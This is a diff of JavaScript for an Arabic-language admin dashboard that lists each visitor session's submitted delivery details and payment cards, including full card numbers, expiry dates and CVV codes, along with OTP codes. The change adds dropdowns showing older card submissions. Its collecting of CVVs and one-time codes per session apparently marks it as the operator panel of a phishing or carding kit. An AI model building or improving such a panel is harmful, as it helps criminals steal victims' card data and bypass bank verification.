@@ -1573,13 +1573,6 @@ function updateCardSection(card, sectionClass, html) {
 
 // Helper: Build delivery section HTML with all submissions history
 function buildDeliverySection(data, allSubmissions = [], sessionId = '') {
-  let html = '<div class="card-section delivery-section" style="padding:12px;">';
-  
-  // Title with count of submissions
-  const count = allSubmissions.length || (data ? 1 : 0);
-  const countBadge = count > 1 ? '<span class="submission-count">' + count + ' إرسالات</span>' : '';
-  html += '<div class="section-title" style="margin-bottom:10px;display:flex;align-items:center;gap:8px;"><span>📦</span> بيانات التوصيل' + countBadge + '</div>';
-  
   // Get all submissions data
   const submissions = [];
   if (allSubmissions && allSubmissions.length > 0) {
@@ -1595,44 +1588,73 @@ function buildDeliverySection(data, allSubmissions = [], sessionId = '') {
     submissions.push({ data: data, timestamp: null, isLatest: true });
   }
   
-  // Show all submissions
-  submissions.forEach((sub, idx) => {
-    const subData = sub.data;
-    const isLatest = sub.isLatest;
-    const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
-    const toggleClass = submissions.length > 1 ? (isLatest ? 'latest-submission' : 'old-submission collapsed') : '';
+  let html = '<div class="card-section delivery-section" style="padding:12px;">';
+  
+  // Title with count and dropdown toggle
+  const count = submissions.length;
+  const hasHistory = count > 1;
+  const countLabel = hasHistory ? count + ' إرسالات' : 'إرسال واحد';
+  const arrowIcon = hasHistory ? '▼' : '';
+  
+  html += '<div class="section-title delivery-history-toggle" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="toggleDeliveryHistory(\'' + sessionId + '\')"' : '') + '>';
+  html += '<span>📦</span> بيانات التوصيل';
+  html += '<span style="margin-right:auto;font-size:12px;color:var(--primary-light);font-weight:600;">' + countLabel + '</span>';
+  html += '<span style="font-size:11px;color:#9ca3af;">' + arrowIcon + '</span>';
+  html += '</div>';
+  
+  // Show current (latest) delivery
+  if (submissions.length > 0) {
+    const current = submissions[0];
+    const currentData = current.data;
     
-    html += '<div class="submission-item ' + toggleClass + '" style="margin-bottom:10px;padding:10px;background:' + (isLatest ? 'rgba(16,185,129,0.1)' : 'rgba(107,114,128,0.1)') + ';border-radius:8px;">';
-    
-    if (submissions.length > 1) {
-      html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">';
-      html += '<span style="font-size:11px;color:' + (isLatest ? 'var(--success)' : '#6b7280') + ';font-weight:600;">' + (isLatest ? '✓ الأحدث' : 'الإرسال السابق') + '</span>';
-      html += '<span style="font-size:11px;color:#9ca3af;">' + timestamp + '</span>';
-      html += '</div>';
-    }
-    
+    html += '<div id="deliveryCurrent_' + sessionId + '" class="delivery-current">';
     html += '<div class="data-grid">';
-    if (subData.fullName) html += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(subData.fullName) + '</span></div>';
-    if (subData.phone) html += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(subData.phone) + '</span></div>';
-    if (subData.email) html += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(subData.email) + '</span></div>';
-    if (subData.city) html += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(subData.city) + '</span></div>';
-    if (subData.address) html += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(subData.address) + '</span></div>';
+    if (currentData.fullName) html += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(currentData.fullName) + '</span></div>';
+    if (currentData.phone) html += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.phone) + '</span></div>';
+    if (currentData.email) html += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(currentData.email) + '</span></div>';
+    if (currentData.city) html += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(currentData.city) + '</span></div>';
+    if (currentData.address) html += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(currentData.address) + '</span></div>';
     html += '</div></div>';
-  });
+  }
+  
+  // History dropdown (for older submissions)
+  if (hasHistory) {
+    let historyItems = '';
+    submissions.slice(1).forEach((sub, idx) => {
+      const subData = sub.data;
+      const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
+      
+      historyItems += '<div class="delivery-history-item" style="padding:10px;background:rgba(59,130,246,0.08);border-radius:8px;margin-bottom:8px;border:1px solid rgba(59,130,246,0.2);">';
+      historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
+      historyItems += '<span style="font-size:11px;color:var(--primary-light);font-weight:600;">الإرسال #' + (idx + 2) + '</span>';
+      historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
+      historyItems += '</div>';
+      historyItems += '<div class="data-grid">';
+      if (subData.fullName) historyItems += '<div class="data-field"><span class="data-label">الاسم</span><span class="data-value">' + escapeHtml(subData.fullName) + '</span></div>';
+      if (subData.phone) historyItems += '<div class="data-field"><span class="data-label">الهاتف</span><span class="data-value" dir="ltr">' + escapeHtml(subData.phone) + '</span></div>';
+      if (subData.email) historyItems += '<div class="data-field"><span class="data-label">البريد</span><span class="data-value">' + escapeHtml(subData.email) + '</span></div>';
+      if (subData.city) historyItems += '<div class="data-field"><span class="data-label">المدينة</span><span class="data-value">' + escapeHtml(subData.city) + '</span></div>';
+      if (subData.address) historyItems += '<div class="data-field full-width"><span class="data-label">العنوان</span><span class="data-value">' + escapeHtml(subData.address) + '</span></div>';
+      historyItems += '</div></div>';
+    });
+    
+    html += '<div id="deliveryHistory_' + sessionId + '" class="delivery-history-dropdown" style="margin-top:10px;display:none;">' + historyItems + '</div>';
+  }
   
   html += '</div>';
   return html;
 }
 
+// Toggle delivery history dropdown
+window.toggleDeliveryHistory = function(sessionId) {
+  const historyEl = document.getElementById('deliveryHistory_' + sessionId);
+  if (historyEl) {
+    historyEl.style.display = historyEl.style.display === 'none' ? 'block' : 'none';
+  }
+};
+
 // Helper: Build payment section HTML with all submissions history
 function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
-  let html = '<div class="card-section payment-section" style="padding:12px;">';
-  
-  // Title with count of submissions
-  const count = allSubmissions.length || (data ? 1 : 0);
-  const countBadge = count > 1 ? '<span class="submission-count">' + count + ' إرسالات</span>' : '';
-  html += '<div class="section-title" style="margin-bottom:10px;display:flex;align-items:center;gap:8px;"><span>💳</span> بيانات الدفع' + countBadge + '</div>';
-  
   // Get all submissions data
   const submissions = [];
   if (allSubmissions && allSubmissions.length > 0) {
@@ -1648,36 +1670,73 @@ function buildPaymentSection(data, allSubmissions = [], sessionId = '') {
     submissions.push({ data: data, timestamp: null, isLatest: true });
   }
   
-  // Show all submissions
-  submissions.forEach((sub, idx) => {
-    const subData = sub.data;
-    const isLatest = sub.isLatest;
-    const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
-    const toggleClass = submissions.length > 1 ? (isLatest ? 'latest-submission' : 'old-submission collapsed') : '';
+  let html = '<div class="card-section payment-section" style="padding:12px;">';
+  
+  // Title with count and dropdown toggle
+  const count = submissions.length;
+  const hasHistory = count > 1;
+  const countLabel = hasHistory ? count + ' بطاقات' : 'بطاقة واحدة';
+  const arrowIcon = hasHistory ? '▼' : '';
+  
+  html += '<div class="section-title payment-history-toggle" style="cursor:' + (hasHistory ? 'pointer' : 'default') + ';margin-bottom:10px;display:flex;align-items:center;gap:8px;" ' + (hasHistory ? 'onclick="togglePaymentHistory(\'' + sessionId + '\')"' : '') + '>';
+  html += '<span>💳</span> بيانات الدفع';
+  html += '<span style="margin-right:auto;font-size:12px;color:var(--success);font-weight:600;">' + countLabel + '</span>';
+  html += '<span style="font-size:11px;color:#9ca3af;">' + arrowIcon + '</span>';
+  html += '</div>';
+  
+  // Show current (latest) payment
+  if (submissions.length > 0) {
+    const current = submissions[0];
+    const currentData = current.data;
+    const cardNum = currentData.cardNumber || currentData.card_number || '';
+    const cvv = currentData.cvv || '';
     
-    html += '<div class="submission-item ' + toggleClass + '" style="margin-bottom:10px;padding:10px;background:' + (isLatest ? 'rgba(16,185,129,0.1)' : 'rgba(107,114,128,0.1)') + ';border-radius:8px;">';
-    
-    if (submissions.length > 1) {
-      html += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">';
-      html += '<span style="font-size:11px;color:' + (isLatest ? 'var(--success)' : '#6b7280') + ';font-weight:600;">' + (isLatest ? '✓ الأحدث' : 'الإرسال السابق') + '</span>';
-      html += '<span style="font-size:11px;color:#9ca3af;">' + timestamp + '</span>';
-      html += '</div>';
-    }
-    
-    const cardNum = subData.cardNumber || subData.card_number || '';
-    const cvv = subData.cvv || '';
-    
+    html += '<div id="paymentCurrent_' + sessionId + '" class="payment-current">';
     html += '<div class="data-grid">';
     if (cardNum) html += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
-    if (subData.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
-    if (subData.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
+    if (currentData.cardHolder) html += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(currentData.cardHolder) + '</span></div>';
+    if (currentData.expiry) html += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(currentData.expiry) + '</span></div>';
     if (cvv) html += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value highlight" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
-    html += '</div></div>';
-  });
+    html += '</div>';
+    html += '</div>';
+  }
+  
+  // History dropdown (for older submissions)
+  if (hasHistory) {
+    let historyItems = '';
+    submissions.slice(1).forEach((sub, idx) => {
+      const subData = sub.data;
+      const timestamp = sub.timestamp ? formatTimeAgo(new Date(sub.timestamp)) : '';
+      const cardNum = subData.cardNumber || subData.card_number || '';
+      const cvv = subData.cvv || '';
+      
+      historyItems += '<div class="payment-history-item" style="padding:10px;background:rgba(107,114,128,0.15);border-radius:8px;margin-bottom:8px;border:1px solid rgba(255,255,255,0.1);">';
+      historyItems += '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">';
+      historyItems += '<span style="font-size:11px;color:#9ca3af;font-weight:600;">البطاقة #' + (idx + 2) + '</span>';
+      historyItems += '<span style="font-size:10px;color:#6b7280;">' + timestamp + '</span>';
+      historyItems += '</div>';
+      historyItems += '<div class="data-grid">';
+      if (cardNum) historyItems += '<div class="data-field"><span class="data-label">البطاقة</span><span class="data-value" dir="ltr">' + escapeHtml(cardNum) + '</span></div>';
+      if (subData.cardHolder) historyItems += '<div class="data-field"><span class="data-label">صاحب البطاقة</span><span class="data-value">' + escapeHtml(subData.cardHolder) + '</span></div>';
+      if (subData.expiry) historyItems += '<div class="data-field"><span class="data-label">تاريخ الانتهاء</span><span class="data-value" dir="ltr">' + escapeHtml(subData.expiry) + '</span></div>';
+      if (cvv) historyItems += '<div class="data-field"><span class="data-label">CVV</span><span class="data-value" dir="ltr">' + escapeHtml(cvv) + '</span></div>';
+      historyItems += '</div></div>';
+    });
+    
+    html += '<div id="paymentHistory_' + sessionId + '" class="payment-history-dropdown" style="margin-top:10px;display:none;">' + historyItems + '</div>';
+  }
   
   html += '</div>';
   return html;
 }
+
+// Toggle payment history dropdown
+window.togglePaymentHistory = function(sessionId) {
+  const historyEl = document.getElementById('paymentHistory_' + sessionId);
+  if (historyEl) {
+    historyEl.style.display = historyEl.style.display === 'none' ? 'block' : 'none';
+  }
+};
 
 // Helper: Build OTP section HTML with digit boxes
 function buildOtpSection(otp, history, sessionId) {
